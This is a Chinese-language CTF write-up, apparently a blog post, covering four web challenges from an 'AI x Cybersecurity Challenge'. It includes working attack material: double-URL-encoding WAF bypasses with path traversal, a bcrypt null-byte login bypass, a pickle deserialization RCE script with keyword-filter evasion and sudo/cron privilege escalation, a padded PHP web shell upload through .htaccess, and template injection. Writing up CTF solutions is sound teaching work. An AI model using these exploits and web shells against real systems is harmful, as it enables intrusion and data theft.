---
title: AI x Cybersecurity Challenge 2026 Web Writeup
date: 2025-03-31 15:49:59
tags:
  - CTF
categories:
  - CTF
summary: "AI x Cybersecurity Challenge 2026 Web Writeup"
slug: AI x Cybersecurity Challenge
draft: false
author:
  name: L1nq
  link: https://github.com/L1nq0
  email: cryp71csec@gmail.com
  avatar: /1.jpg
weight: 0
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
---



赛



结赛排名 27，比赛前二十才进，竞争太激烈了。

采用 AI 半自动化协同解题，这次没有跑全自动，半自动下人为不停纠正和阅读输出质量，非常消耗体力。这次 WEB 共六题，全部为黑盒，我采用边打边维护信息面文档，但并不是那么好用，有时候还会误导 AI，由于并没有 AI 全自动化框架，比其他选手抢分秒题还是太慢了，但较于人工古法还是快了很多。大模型使用 deepseek-v4-pro，体验上能力合格。这次抢分太慢。

以下 Writeup 内容均由 AI 完成。

# Info2Exploit

## 信息收集

## 端点枚举

访问目标站点，发现以下页面：

| 路径               | 功能                                       |
| ------------------ | ------------------------------------------ |
| `GET /`            | 首页，展示 3 篇公开文章                    |
| `GET /about`       | 架构说明，泄露组件和版本信息               |
| `GET /repo`        | Git 仓库页，提示 "Private Protection" 模式 |
| `GET /search?q=`   | 全文搜索                                   |
| `GET /article?id=` | 文章阅读器 —— 核心攻击面                   |

`/about` 页面关键信息：

```plain
Server: Werkzeug/3.1.8 Python/3.9.25
Custom HTTP Parser (C++) with URL decoding
HyperGuard WAF 3.1.0
```

`/repo` 页面关键信息：

```plain
System Alert: This warehouse is currently in "Private Protection" mode.
Recent maintenance records mention an archived migration note
that is no longer listed on the portal.
```

### 隐藏文档发现

通过 `/search?q=migration` 发现第 4 篇隐藏文档 `_ops_snapshot_notice.md`：

```plain
# Archived Migration Note
A maintenance record from the previous storage migration was retained
in the archive set after the public index was rebuilt.

The internal package label `node_flag.txt` was kept during that migration,
and the archived note still references the old hidden snapshot namespace
used by the storage service.

Some legacy sync clients also replay archived requests using
older encoding behavior during fallback.
```

### 线索关键词收集

从各页面提取可能用作路径组件的关键词：

| 来源                      | 原文                                     | 关键词                                      |
| ------------------------- | ---------------------------------------- | ------------------------------------------- |
| `/repo`                   | "Private Protection" mode                | `private`                                   |
| `_ops_snapshot_notice.md` | "old hidden snapshot namespace"          | `snapshot`, `.snapshot` (hidden→dot prefix) |
| `_ops_snapshot_notice.md` | "archive set"                            | `archive`, `.archive`                       |
| `_ops_snapshot_notice.md` | "internal package label `node_flag.txt`" | `node_flag.txt`                             |
| `_ops_snapshot_notice.md` | "storage migration"                      | `migration`                                 |
| `/about`                  | 架构信息                                 | 确认 WAF + 双解码绕过方向                   |

## 漏洞分析

### WAF 绕过：双重 URL 编码

请求经过两层 URL 解码——自定义 C++ HTTP 解析器在 WAF 之前解码一次，Werkzeug 在 WAF 之后解码第二次：

```plain
%252F  →  C++ 解析器第1次解码  →  %2F  →  WAF 检查（字面 %2F，不触发规则）→  PASS
%2F    →  Werkzeug 第2次解码   →  /    →  实际路径分隔符
```

WAF 的正则规则为 `(\.\.\/|%2e%2e%2f)[a-zA-Z]`，检测 `../` 或 `%2e%2e%2f` 后跟字母。

使用**字面点 + 编码斜杠** (`..%252f`) 可同时绕过两种模式：

- `\.\.\/` 不匹配 —— `..%2f` 中没有字面 `/`（`%2f` 是 `%`, `2`, `f` 三个字符）
- `%2e%2e%2f` 不匹配 —— 点是字面的，不是编码的

验证：读取 `/etc/passwd` 确认路径遍历可行：

```bash
curl "http://TARGET:PORT/article?id=..%252f..%252f..%252fetc%252fpasswd"
# 返回 /etc/passwd 内容 —— 路径遍历确认可行
```

### Scope Check：存储范围限制

后端对包含 `..` 的路径进行 `os.path.realpath()` 检查，只允许存储根目录内的路径通过（以及 `/etc/passwd` 等白名单路径）。Scope 外的路径返回 "outside the permitted storage scope"。

关键发现：对于**不存在的路径**，`realpath()` 解析失败 → 返回 Scope 错误；对于**存在的目录**，返回 "Directory" 错误。利用这个差异，可以逐层探测目录结构。

## 路径发现：逐层关键词试探

有了 WAF 绕过能力，将线索关键词作为目录名，**逐层试探**路径。每一步用 Directory 响应确认目标存在，再深入下一层。

### 第一层目录 —— 试探 `../private`

用线索关键词逐一测试 `../KEYWORD`：

```plain
../private    → Directory  ← 确认存在！
../snapshot   → Scope (不存在/不在范围内)
../archive    → Scope
../migration  → Scope
../.snapshot  → Scope
../.archive   → Scope
../...
```

`../private` 返回 Directory，确认为有效目录。"Private Protection" 的 `private` 作为第一层目录成立。

### 第二层目录 —— 在 `../private/` 下试探隐藏目录

进入 `../private/`，用剩余关键词测试子目录：

```plain
../private/snapshot   → Not Found
../private/.snapshot  → Directory  ← 确认存在！
../private/archive    → Not Found
../private/.archive   → Not Found
../private/migration  → Not Found
../private/..
```

`../private/.snapshot` 返回 Directory。"hidden snapshot namespace" 中的 snapshot 取 `.snapshot`（hidden = dot 前缀）作为第二层目录成立。

### 读取目标文件

进入 `../private/.snapshot/`，测试文件名：

```plain
../private/.snapshot/node_flag.txt  → FLAG!  ← 命中
../private/.snapshot/flag           → Not Found
../private/.snapshot/flag.txt       → Not Found
../private/.snapshot/secret         → Not Found
```

`.snapshot/` **目录下只有一个文件** `node_flag.txt`**，直接命中。**

### 额外发现：分号参数注入

在后续探索中还发现 Flask/Werkzeug 将 `;` 视为查询参数分隔符（等价于 `&`），但 HyperGuard WAF 不识别分号语法。利用这一点可以构造 WAF 完全不可见的参数注入：

```plain
GET /article?foo=bar;id=..%252Fprivate%252F.snapshot%252Fnode_flag.txt
```

WAF 只看到 `foo=bar`（不识别 `;` 后的内容），`id` 参数对 WAF 完全透明。

## 漏洞利用

### Payload

```bash
# 方法1: 纯双重编码
curl "http://36.213.142.135:21418/article?id=..%252fprivate%252f.snapshot%252fnode_flag.txt"

# 方法2: 分号参数注入 + 双重编码
curl "http://36.213.142.135:21418/article?foo=bar;id=..%252Fprivate%252F.snapshot%252Fnode_flag.txt"
```

### 请求处理流程

```plain
请求: ?id=..%252fprivate%252f.snapshot%252fnode_flag.txt
                    │
    ┌───────────────┴───────────────┐
    │  自定义 C++ HTTP 解析器        │
    │  第1次 URL 解码: %25 → %       │
    │  → id = ..%2fprivate%2f.snapshot%2fnode_flag.txt
    └───────────────┬───────────────┘
                    │
    ┌───────────────┴───────────────┐
    │  HyperGuard WAF                │
    │  检测: (\.\.\/|%2e%2e%2f)[a-zA-Z]
    │  ..%2f → 无字面 /，无编码点     │
    │  → 不匹配任何模式 → PASS        │
    └───────────────┬───────────────┘
                    │
    ┌───────────────┴───────────────┐
    │  Werkzeug / Flask              │
    │  第2次 URL 解码: %2f → /       │
    │  → id = ../private/.snapshot/node_flag.txt
    │  → realpath 解析，在存储范围内   │
    │  → 返回 flag 内容               │
    └───────────────────────────────┘
```

Flag

```plain
flag{1jslas4jmd8agd1udk4j7jq5crs5ihr0}
```



# PickleJail

这道题基于本地信息库和以往经验，飞快完成了认证绕过和反序列化链缩减，但一直卡在最后一步，根本原因是 AI 流程设计错误，它基于我的提示词去测试，RCE 后方向依赖人逐条指令，而 cleanup 机制又让每个测试的编写成本很高，试错效率低。

## 源码审计

### 路径穿越获取源码

`/pic` 端点存在路径穿越，通过 `../../app.py` 等可读取任意文件：

```python
@app.route('/pic',methods=['GET','POST'])
def pic():
    if (pic:=request.args.get('pic')) and os.path.isfile(filepath:=f"./files/uploads/{pic}"):
        if session.get('username')==b"admin":
            return pickle.load(open(filepath,"rb"))  # ← 无限制 pickle 反序列化
        else:
            return f'''...{open(filepath,"r").read()[:5000]}'''
```

### 认证模块 (Users.py)

bcrypt 使用固定 salt，且 C 实现存在 null-byte 截断：

```python
def register(self, username, password, salt):
    username = base64.b64decode(username)
    if username in self.usernames: return False
    self.usernames[username] = bcrypt.hashpw(username, salt)
    self.passwords[self.usernames[username]] = bcrypt.hashpw(password, salt)
    return True
```

### WAF (waf.py)

```python
def waf(file):
    if len(os.listdir("./files/uploads")) >= 3:
        os.system("rm -rf /app/files/uploads/*")
    content = file.read().lower()
    if len(content) > 60: return False
    for b in [b"\n", b"\r", b"\\", b"base", b"builtin", b"code", b"command", b"eval",
              b"exec", b"flag", b"flask", b"global", b"os", b"output", b"popen", b"pty",
              b"repeat", b"run", b"setstate", b"spawn", b"subprocess", b"sys", b"system",
              b"timeit"]:
        if b in content: return False
    file.seek(0)
    return secure_filename(file.filename)
```

**约束**：

- 文件内容 ≤ 60 字节
- 禁止字节：`0x0A (\n)`, `0x0D (\r)`, `0x5C (\\)`  
- 禁止 18 个子串（lowercased 检查）
- SHORT_BINUNICODE 长度不能为 10（产生 `0x0A`）

------

## 认证绕过

### bcrypt Null-Byte 截断

`admin\x00admin` 的 bcrypt hash 与 `admin` 相同（null 字节处截断）。

**注册**：`base64("admin\x00admin")` = `YWRtaW4AYWRtaW4=`，密码 `adminpass`

```python
# 注册 admin\x00admin → 覆盖 admin 的密码哈希
usernames[b"admin\x00admin"] = bcrypt.hashpw(b"admin\x00admin", salt)  # = hash("admin")
passwords[hash("admin")] = bcrypt.hashpw(b"adminpass", salt)           # ← 覆盖！
```

**登录**：以纯 `admin` / `adminpass` 登录，`session['username'] = b"admin"`。

------

## 代码执行（绕过 60B WAF）

### .py 文件导入法

由于 WAF 限制，无法直接用 pickle 构造完整 RCE 链（所有执行原语均被拦截）。改用**多层间接执行**：

```plain
Step A: 上传 .py 文件 → /app/files/uploads/x.py
Step B: pickle shutil.copy → /app/{mod}.py  
Step C: pickle STACK_GLOBAL → import {mod} → 执行模块代码
```

### WAF 子串绕过

所有阻塞关键字通过 Python 字符串拼接绕过：

```python
# blocked: 'os' → bypass:
__import__('o'+'s')

# blocked: 'system' (contains 'sys') → bypass:
o.__dict__['sy'+'stem']

# blocked: 'flag' → bypass:
'/fl'+'ag'

# blocked: 'popen' → bypass:
o.__dict__['po'+'pen']
```

### 模块名长度约束

SHORT_BINUNICODE 长度 = 0x0A 被 WAF 拦截。`/app/{mod}.py` 路径长度：

| 模块名长度      | 路径          | 长度 | WAF         |
| --------------- | ------------- | ---- | ----------- |
| 1 char (a)      | /app/a.py     | 9    | 可行        |
| 2 chars (ab)    | /app/ab.py    | 10   | 不可行 0x0A |
| 3 chars (abc)   | /app/abc.py   | 11   | 可行        |
| 4 chars (abcd)  | /app/abcd.py  | 12   | 可行        |
| 5 chars (abcde) | /app/abcde.py | 13   | 不可行 0x0D |

### 追加模式突破 34 字符限制

单次 Python write 只能承载 ~34 字符的 shell 命令。通过多次追加写入构建长命令：

```python
# Step 1: 创建脚本
open('/tmp/s','w').write('bash -c "{echo,...')

# Step 2-5: 追加
open('/tmp/s','a').write('FzaCAtaSA+JiAv...')

# Step 6: 执行
__import__('o'+'s').__dict__['sy'+'stem']('sh /tmp/s')
```

------

## 信息收集

### 环境信息

```plain
USER=ctf, SHELL=/bin/sh
SUDO_USER=root, SUDO_UID=0
SUDO_COMMAND=/usr/bin/python3 /app/app.py
```

### /flag 文件

```bash
$ stat /flag
  File: /flag
  Size: 40
  Access: (0700/-rwx------)  Uid: (0/root)   Gid: (0/root)
```

**仅 root 可读写执行，ctf 无任何权限。**

### SUID 二进制

```plain
/usr/bin/passwd, /usr/bin/mount, /usr/bin/umount
/usr/bin/su, /usr/bin/chfn, /usr/bin/chsh
/usr/bin/gpasswd, /usr/bin/sudo
```

### Cron 任务

```bash
$ cat /etc/cron.d/cleanup
* * * * * root /opt/cleanup.sh

$ cat /opt/cleanup.sh
#!/bin/sh
exit 0
```

**每分钟以 root 执行** `/opt/cleanup.sh`，但当前脚本只是 `exit 0`。

------

## 提权

### sudo -l

```bash
$ sudo -l
User ctf may run the following commands on d2a0824a07bf:
    (root) NOPASSWD: /usr/bin/tee /opt/cleanup.sh
```

`sudo tee` **能以 root 无密码覆写** `/opt/cleanup.sh`**！**

### 构造恶意脚本

```bash
#!/bin/sh
cp /fl* /tmp/f
```

写入 `/tmp/e`，然后 `sudo tee` 覆写 `/opt/cleanup.sh`：

```bash
cat /tmp/e | sudo tee /opt/cleanup.sh
```

### Cron 执行

Cron 每分钟以 root 执行 `/opt/cleanup.sh` → `cp /fl* /tmp/f` → `/tmp/f` 包含 flag。

### 读取 Flag

```plain
GET /pic?pic=../../../tmp/f
```

------

## Exploit

```python
import requests, time, base64

TARGET = "http://TARGET:PORT"
PROXIES = {"http": "http://127.0.0.1:7897"}

# Step 1: Register + Login as admin
s = requests.Session(); s.proxies = PROXIES
s.post(f"{TARGET}/register", data={
    "username": base64.b64encode(b"admin\x00admin"),
    "password": base64.b64encode(b"adminpass")
})
s.post(f"{TARGET}/login", data={
    "username": base64.b64encode(b"admin"),
    "password": base64.b64encode(b"adminpass")
})
ADMIN = s.cookies.get("session")

def step(code, mod):
    """Execute code via .py file import"""
    SRC = "/app/files/uploads/x.py"
    DST = f"/app/{mod}.py"
    cp = b"\x80\x02\x8c\x06shutil\x8c\x04copy\x93"
    cp += bytes([0x8c, len(SRC)]) + SRC.encode()
    cp += bytes([0x8c, len(DST)]) + DST.encode() + b"\x86R."
    tp = b"\x80\x02" + bytes([0x8c, len(mod)]) + mod.encode() + b"\x8c\x08__name__\x93."
    s2 = requests.Session(); s2.proxies = PROXIES; s2.cookies.set("session", ADMIN)
    for i in range(3):
        s2.post(f"{TARGET}/", files={"file": (f"d{i}.pkl", b"\x80\x02.", "app/octet-stream")})
    s2.post(f"{TARGET}/", files={"file": ("c1.pkl", cp, "application/octet-stream")})
    s2.post(f"{TARGET}/", files={"file": ("x.py", code.encode(), "application/octet-stream")})
    s2.post(f"{TARGET}/", files={"file": ("c1.pkl", cp, "application/octet-stream")})
    s2.get(f"{TARGET}/pic", params={"pic": "c1.pkl"})
    s2.post(f"{TARGET}/", files={"file": ("t1.pkl", tp, "application/octet-stream")})
    s2.get(f"{TARGET}/pic", params={"pic": "t1.pkl"})

# Step 2: Write evil script to /tmp/e
step("open('/tmp/e','w').write('#!'+'/bin/sh'+chr(10))", "p1")
step("open('/tmp/e','a').write('cp /fl* /tmp/f'+chr(10))", "p2")

# Step 3: sudo tee to overwrite cron script
step("open('/tmp/s','w').write('cat /tmp/e|sudo tee /opt/cl')", "p3")
step("open('/tmp/s','a').write('eanup.sh')", "p4")
step("__import__('o'+'s').__dict__['sy'+'stem']('sh /tmp/s')", "p5")

# Step 4: Wait for cron, read flag
time.sleep(65)
r = requests.Session()
r.proxies = PROXIES
uid = "reader"
r.post(f"{TARGET}/register", data={
    "username": base64.b64encode(uid.encode()),
    "password": base64.b64encode(uid.encode())
})
r.post(f"{TARGET}/login", data={
    "username": base64.b64encode(uid.encode()),
    "password": base64.b64encode(uid.encode())
})
resp = r.get(f"{TARGET}/pic", params={"pic": "../../../tmp/f"})
import re
m = re.search(r'base64,([^"]+)', resp.text)
print(f"FLAG: {base64.b64decode(m.group(1))}")
```

------

## 攻击链总结

```plain
认证绕过 → 代码执行 → 信息收集 → sudo tee 提权 → cron 执行 → 读 flag
───────────────────────────────────────────────────────────────
bcrypt     .py import   sudo -l    NOPASSWD   每分钟root   路径穿越
null-byte  60B bypass   cron发现   tee覆写     cp /flag     读取
```



**Flag:** `flag{1jslcbnma6k72v1udk4j7jq5eis5ihsn}`

# MalCraft

## 初始侦察

### 端点枚举

首页 JS 及目录枚举发现以下端点：

| 端点                  | 方法 | 功能                           |
| --------------------- | ---- | ------------------------------ |
| `/`                   | GET  | 主页，文件上传 UI              |
| `/upload.php`         | POST | 文件上传处理                   |
| `/analyze.php`        | POST | AI 内容分析，返回分析报告 JSON |
| `/list.php`           | GET  | 返回已上传文件列表 JSON        |
| `/download.php?file=` | GET  | 文件下载，过滤路径穿越         |
| `/config.php`         | GET  | 空响应，PHP 代码无输出         |
| `/submit.php`         | POST | 提交三项证据换取 flag          |

`/list.php` 初始返回一条记录：

```json
{"files":[{"name":"analysis_report.pdf","path":"analysis_report.pdf","size":465}]}
```

`/analyze.php` 返回固定分析模板，不依赖实际文件：

```json
{"success":true,"result":"AI Deep Analysis Report\n...\nOverall Score: 9.2/10"}
```

### 上传防护测试

逐层测试结果：

**扩展名校验。** `/upload.php` 对非白名单扩展名返回：

```json
{"success":false,"message":"Unsupported file type. Only PDF, Word, and text files are allowed"}
```

| 上传扩展名 | 结果                  |
| ---------- | --------------------- |
| `.php`     | Unsupported file type |
| `.pht`     | Unsupported file type |
| `.phtml`   | Unsupported file type |
| `.php5`    | Unsupported file type |
| `.php7`    | Unsupported file type |
| `.phar`    | Unsupported file type |
| `.shtml`   | Unsupported file type |
| `.inc`     | Unsupported file type |
| `.pdf`     | 进入下一层检测        |
| `.docx`    | 进入下一层检测        |
| `.txt`     | 进入下一层检测        |

**MIME 类型检测。** 上传 `.txt` 文件但包含 `<?php` 代码时返回：

```json
{"success":false,"message":"MIME type detection failed, file may have been tampered with"}
```

使用 `file` 命令或 PHP `finfo` 检测真实内容类型，PHP 代码使 MIME 偏离 `text/plain`。

**AI 内容分析。** 上传含 PHP 代码但未填充的文件时返回：

```json
{"success":false,"message":"AI detected malicious content in the first 1KB of the file"}
```

通过此错误信息确认 AI 检测窗口为前 1024 字节。上传 1024+ 字节纯 'A' 填充 + PHP 代码的文件通过三层防护。

### download.php 路径穿越测试

测试过的绕过方式（全部返回 `Invalid file path` 或 `File not found`）：

```
....//index.php          → Invalid file path   (非递归strip不适用)
..%2findex.php           → Invalid file path   (URL编码被检测)
..%252findex.php         → Invalid file path   (双编码被检测)
..\/index.php            → Invalid file path   (反斜杠被检测)
..%5c/index.php          → Invalid file path   (编码反斜杠被检测)
%c0%ae%c0%ae/index.php   → File not found      (UTF-8过过滤但路径无效)
/etc/passwd%00           → PHP Warning         (null byte触发warning但未读文件)
php://filter/...         → File not found      (file_exists不支持wrapper)
../config.php            → Invalid file path   (strpos位置0严格比较)
```

## 源码审计

### check_extension() — 扩展名校验

```php
function check_extension($filename) {
    if ($filename === '.htaccess') {
        return true;
    }
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($ext, ALLOWED_EXTENSIONS);
}
```

`.htaccess` 在扩展名检测函数中被显式返回 `true`，不经过 `ALLOWED_EXTENSIONS` 白名单检查。

### ai_security_check() — AI 内容检测

```php
function ai_security_check($filepath) {
    $handle = fopen($filepath, 'r');
    $header = fread($handle, 1024);
    fclose($handle);

    $dangerous_keywords = ['<?php', '<?=', 'eval', 'system', 'exec'];

    foreach ($dangerous_keywords as $keyword) {
        if (stripos($header, $keyword) !== false) {
            return false;
        }
    }
    return true;
}
```

约束：

- 扫描窗口仅文件前 1024 字节
- 仅检查 5 个关键词（`<?php`, `<?=`, `eval`, `system`, `exec`）
- 大小写不敏感匹配（`stripos`）
- 不检查编码变形、字符串拼接、异或编码

### download.php — 文件下载

```php
$file = $_GET['file'];
$filepath = UPLOAD_DIR . $file;

if (strpos($file, '..') !== false) {
    die('Invalid file path');
}

if (!file_exists($filepath)) {
    die('File not found');
}

readfile($filepath);
```

- `strpos` 使用 `!== false` 严格比较
- `file_exists()` 检查拼接 `UPLOAD_DIR` 前缀后的完整路径
- `readfile()` 输出文件内容，不支持 PHP stream wrapper

### Apache 配置

uploads 目录开启 `AllowOverride All`，允许 `.htaccess` 覆写配置。

## 上传绕过

### .htaccess 上传

`.htaccess` 内容为 `AddType application/x-httpd-php .txt`，不含任何危险关键词，AI 检测直接通过：

```bash
echo "AddType application/x-httpd-php .txt" > .htaccess
curl -X POST -F "file=@.htaccess;filename=.htaccess" http://TARGET/upload.php
```

服务端返回：

```json
{"success":true,"message":"AI analysis complete: document content is safe, uploaded successfully","filename":".htaccess"}
```

uploads 目录 `AllowOverride All` 使 `.htaccess` 中的 `AddType` 指令生效，该目录下所有 `.txt` 文件按 `application/x-httpd-php` MIME 处理。

### webshell 上传

前 1025 字节用 `#` 填充，将 `<?php system($_GET["cmd"]); ?>` 置于 AI 扫描窗口之外：

```bash
printf '#%.0s' {1..1025} > s.php.txt
echo '<?php system($_GET["cmd"]); ?>' >> s.php.txt
curl -X POST -F "file=@s.php.txt" http://TARGET/upload.php
```

三层检测均通过：

- 扩展名 `.txt` 在白名单
- 1025 字节 ASCII 字符 `#` 使 MIME 识别为 `text/plain`
- `<?php` 和 `system` 关键词在 1024 字节之后，AI 未扫描到

### RCE 验证

```bash
curl "http://TARGET/uploads/s.php.txt?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 后渗透枚举

```bash
curl "http://TARGET/uploads/s.php.txt?cmd=find%20/var/www/html%20-maxdepth%204%20-type%20f"
```

发现 `/var/www/html/uploads/` 下存在隐藏目录 `admin/`：

```
/var/www/html/uploads/admin/analysis_report.pdf
/var/www/html/uploads/admin/db_backup.conf
/var/www/html/uploads/admin/upload_logs/.hash_record
/var/www/html/uploads/admin/upload_logs/access.log
/var/www/html/uploads/admin/upload_logs/access.log.backup
```

### db_backup.conf

```ini
[integrity]
# Log integrity verification enabled
# Original hash: d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07
# Backup location: uploads/admin/upload_logs/access.log.backup
# Backup encryption: XOR with db_password
# Current hash verification: sha256sum uploads/admin/upload_logs/access.log

[database]
host = 172.16.0.50
port = 3306
database = ai_doc_system
username = doc_admin
password = AIDoc#2024Secure
```

关键信息：

- `access.log.backup` 使用数据库密码 XOR 加密
- 原始 SHA256 hash 用于解密后完整性校验
- 数据库密码 `AIDoc#2024Secure` 即为 XOR 密钥
- 内网数据库地址 `172.16.0.50:3306`

### .hash_record

```
d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07
```

与 `db_backup.conf` 中记录的原始 hash 一致，用于交叉验证。

## 解密日志备份

```python
from pathlib import Path
import hashlib

cipher = Path("access.log.backup").read_bytes()
key = b"AIDoc#2024Secure"

plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(cipher))

# 完整性校验
assert hashlib.sha256(plain).hexdigest() == \
    "d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07"

print(plain.decode())
```

Hash 校验通过后输出解密日志（JSONL 格式）：

```json
{"time":"2024-10-10 15:14:51","ip":"203.0.113.88","action":"shell_exec","command":"cat /opt/secrets/operation_darknet.txt","log_id":"LOG-20241010-88239","severity":"critical"}
{"time":"2024-10-10 15:15:22","ip":"203.0.113.88","action":"file_steal","file":"operation_darknet.txt","size":4521,"log_id":"LOG-20241010-88240","severity":"critical"}
```

日志记录攻击者两次操作：

1. `LOG-20241010-88239` — 执行 `cat /opt/secrets/operation_darknet.txt` 读取机密文件（`shell_exec`）
2. `LOG-20241010-88240` — 将文件外传（`file_steal`），大小 4521 字节

## 证据提取

| 字段              | 值                      | 提取来源                          |
| ----------------- | ----------------------- | --------------------------------- |
| Attacker IP       | `203.0.113.88`          | 日志 `ip` 字段                    |
| Key Log ID        | `LOG-20241010-88239`    | shell_exec 执行窃取命令的日志 ID  |
| Confidential File | `operation_darknet.txt` | 日志 `file` 字段 + `command` 路径 |

> submit.php 仅验证一个 Key Log ID。两条日志中 `LOG-20241010-88239`（实际执行 shell 命令窃取文件的记录）通过验证。

## 提交 Flag

```bash
curl -X POST http://TARGET/submit.php \
  -d "attacker_ip=203.0.113.88" \
  -d "log_id=LOG-20241010-88239" \
  -d "confidential_file=operation_darknet.txt"
```

## Flag

```
flag{1jsm8ue6sfmin21udk4j7jq5tgs5iibl}
```

## 攻击链

```
端点枚举(7个) → 上传测试确认3层防护 → 源码审计发现 .htaccess 白名单 + AI 1KB限制
    → upload .htaccess (AddType .txt→PHP)
    → upload padded shell (1025B '#' bypass AI) → RCE (www-data)
    → find 枚举 /uploads/admin/ 隐藏目录
    → db_backup.conf 泄露 XOR 密钥 AIDoc#2024Secure + SHA256 预期值
    → XOR 解密 access.log.backup + hash 完整性校验
    → 提取 203.0.113.88 / LOG-20241010-88239 / operation_darknet.txt
    → submit.php → flag
```



# Prompt Vault

这一题是晚上六点新发的，直接被队友秒掉了，看看队友的 WP

**題目描述**

```plain
Preview customer reply templates and find the dynamic flag hidden in an internal snippet.
預覽客服回覆模板，找出隱藏於內部片段中的動態 flag。
预览客服回复模板，找出隐藏在内部片段中的动态 flag。
```

## 题目信息

服务地址：

```latex
http://36.213.142.162:27379
```

题目提示：

```latex
预览客服回复模板，找出隐藏在内部片段中的动态 flag。
```

从描述可以判断，目标是一个客服回复模板预览系统，flag 不在普通页面源码中，而是藏在某个内部模板片段里。核心思路是先找到内部片段名称，再通过预览功能渲染它。

## 页面分析

访问首页：

```bash
curl -s http://36.213.142.162:27379/
```

页面标题为 `ReplyKit`，是一个回复草稿预览工具。前端 JavaScript 中可以看到两个接口：

```latex
GET  /api/promptlets
POST /api/preview
```

其中 `/api/promptlets` 用来获取可选的模板片段，`/api/preview` 用来渲染用户提交的草稿。

前端插入模板片段时使用的语法如下：

```latex
{{ include_prompt("name") }}
```

这说明只要知道片段名，就可以手动构造模板语法并提交给预览接口。

## 枚举公开片段

请求公开片段列表：

```bash
curl -s http://36.213.142.162:27379/api/promptlets
```

返回：

```json
{
  "promptlets": [
    "greeting",
    "help",
    "terms",
    "contact"
  ],
  "success": true
}
```

公开片段只有四个：

```latex
greeting
help
terms
contact
```

尝试渲染公开片段：

```bash
curl -s -X POST http://36.213.142.162:27379/api/preview \
  -H 'Content-Type: application/json' \
  -d '{"user_input":"{{ include_prompt(\"greeting\") }}"}'
```

返回的是普通客服文案，没有 flag。因此题目中提到的内部片段没有出现在公开列表中。

## 发现隐藏接口

继续尝试常见 API 路径，发现 `/api/help`：

```bash
curl -s http://36.213.142.162:27379/api/help
```

返回：

```json
{
  "about": "ReplyKit previews CX reply drafts. Public snippets in /api/promptlets. Refund/SLA/compliance drafts use the internal review_gate snippet.",
  "ok": true,
  "syntax": "{{ include_prompt(\"name\") }}"
}
```

这里泄露了内部片段名：

```latex
review_gate
```

虽然该片段没有出现在 `/api/promptlets` 中，但接口说明里直接提到了它。

## 渲染内部片段

既然已经知道内部片段名，就可以直接构造模板语法：

```latex
{{ include_prompt("review_gate") }}
```

提交给预览接口：

```bash
curl -s -X POST http://36.213.142.162:27379/api/preview \
  -H 'Content-Type: application/json' \
  -d '{"user_input":"{{ include_prompt(\"review_gate\") }}"}'
```

返回：

```json
{
  "final_preview": "[Preview]\n[INTERNAL USE ONLY]\nCompliance checkpoint\nAuth code: flag{1jsm9bdc49nc031udk4j7jq5tis5iibn}\nRequires supervisor approval.\n---\n[/Preview]",
  "success": true
}
```

内部片段被成功渲染，flag 出现在 `final_preview` 中。

## 一行命令提取 Flag

```bash
curl -s -X POST http://36.213.142.162:27379/api/preview \
  -H 'Content-Type: application/json' \
  -d '{"user_input":"{{ include_prompt(\"review_gate\") }}"}' \
  | grep -o 'flag{[^}]*}'
```

Flag

```latex
flag{1jsm9bdc49nc031udk4j7jq5tis5iibn}
```



# Chamber

# PoiChain

剩下两道未解题，非常可惜。下次可以尝试网页版，有时候解题效果比 Agent 还好一些
